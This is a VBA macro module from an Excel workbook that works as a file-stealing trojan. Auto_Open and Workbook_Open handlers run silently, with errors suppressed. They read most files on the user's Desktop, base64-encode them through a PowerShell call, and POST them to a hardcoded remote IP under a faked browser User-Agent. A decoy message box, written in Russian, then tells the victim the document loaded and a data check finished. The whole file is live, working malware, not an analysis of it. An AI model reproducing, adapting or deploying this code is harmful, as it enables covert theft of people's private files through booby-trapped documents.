Attribute VB_Name = "ThisWorkbook"
Sub Auto_Open()
    On Error Resume Next
    Call SendDesktopFiles
End Sub

Sub Workbook_Open()
    On Error Resume Next
    Call SendDesktopFiles
End Sub

Sub SendDesktopFiles()
    Dim desktopPath As String
    Dim fso As Object
    Dim folder As Object
    Dim file As Object
    Dim http As Object
    Dim fileContent As Variant
    Dim fileName As String
    Dim filePath As String
    Dim serverUrl As String
    
    serverUrl = "http://213.213.213.213:8080/upload"
    desktopPath = CreateObject("WScript.Shell").SpecialFolders("Desktop")
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set folder = fso.GetFolder(desktopPath)
    Set http = CreateObject("MSXML2.XMLHTTP")
    
    For Each file In folder.Files
        On Error Resume Next
        fileName = file.Name
        filePath = file.Path
        
        If Not (fileName Like "*.lnk" Or fileName Like "~$*" Or fileName Like "*.tmp" Or fileName Like "*.xls*") Then
            If file.Size < 10485760 Then
                fileContent = ReadFileContent(filePath)
                If Len(fileContent) > 0 Then
                    SendFileToServer http, serverUrl, fileName, fileContent
                End If
            End If
        End If
        On Error GoTo 0
    Next file
    
    Application.Wait Now + TimeValue("00:00:01")
    MsgBox "Документ загружен успешно. Проверка данных завершена.", vbInformation, "Информация"
    
    Set http = Nothing
    Set folder = Nothing
    Set fso = Nothing
End Sub

Function ReadFileContent(filePath As String) As Variant
    Dim fso As Object
    Dim file As Object
    Dim content As String
    Dim stream As Object
    
    On Error Resume Next
    
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.LoadFromFile filePath
    content = stream.Read
    stream.Close
    Set stream = Nothing
    
    If Len(content) = 0 Then
        Set fso = CreateObject("Scripting.FileSystemObject")
        If fso.FileExists(filePath) Then
            Set file = fso.OpenTextFile(filePath, 1, False)
            If Not file.AtEndOfStream Then
                content = file.ReadAll
            End If
            file.Close
            Set file = Nothing
        End If
        Set fso = Nothing
    End If
    
    ReadFileContent = content
    On Error GoTo 0
End Function

Sub SendFileToServer(http As Object, serverUrl As String, fileName As String, fileContent As Variant)
    Dim base64Content As String
    Dim jsonData As String
    Dim shell As Object
    Dim exec As Object
    Dim tempFile As String
    Dim fso As Object
    Dim file As Object
    Dim psCmd As String
    Dim safeFileName As String
    Dim safeContent As String
    Dim safeTimestamp As String
    Dim psScript As String
    Dim psFile As String
    
    On Error Resume Next
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    tempFile = fso.GetSpecialFolder(2) & "\temp_" & Replace(Replace(Now, ":", ""), "/", "") & ".txt"
    
    Set file = fso.CreateTextFile(tempFile, True)
    file.Write fileContent
    file.Close
    Set file = Nothing
    
    Set shell = CreateObject("WScript.Shell")
    psFile = Replace(Replace(tempFile, "\", "/"), "'", "")
    psScript = "$b=[System.IO.File]::ReadAllBytes('" & psFile & "'); [Convert]::ToBase64String($b)"
    psCmd = "powershell -Command " & Chr(34) & psScript & Chr(34)
    
    Set exec = shell.Exec(psCmd)
    Do While exec.Status = 0
        Application.Wait Now + TimeValue("00:00:00.1")
    Loop
    
    base64Content = Trim(exec.StdOut.ReadAll)
    
    If fso.FileExists(tempFile) Then
        fso.DeleteFile tempFile
    End If
    
    Set exec = Nothing
    Set shell = Nothing
    Set fso = Nothing
    
    If Len(base64Content) < 10 Then
        base64Content = fileContent
    End If
    
    safeFileName = Replace(Replace(fileName, Chr(34), "\" & Chr(34)), vbCrLf, "")
    safeContent = Replace(Replace(base64Content, Chr(34), "\" & Chr(34)), vbCrLf, "")
    safeTimestamp = Format(Now, "yyyy-mm-dd hh:nn:ss")
    
    jsonData = "{" & Chr(34) & "filename" & Chr(34) & ":" & Chr(34) & safeFileName & Chr(34) & "," & Chr(34) & "content" & Chr(34) & ":" & Chr(34) & safeContent & Chr(34) & "," & Chr(34) & "timestamp" & Chr(34) & ":" & Chr(34) & safeTimestamp & Chr(34) & "}"
    
    http.Open "POST", serverUrl, False
    http.setRequestHeader "Content-Type", "application/json"
    http.setRequestHeader "User-Agent", "Mozilla/5.0"
    http.setRequestHeader "Accept", "application/json"
    http.send jsonData
    
    On Error GoTo 0
End Sub
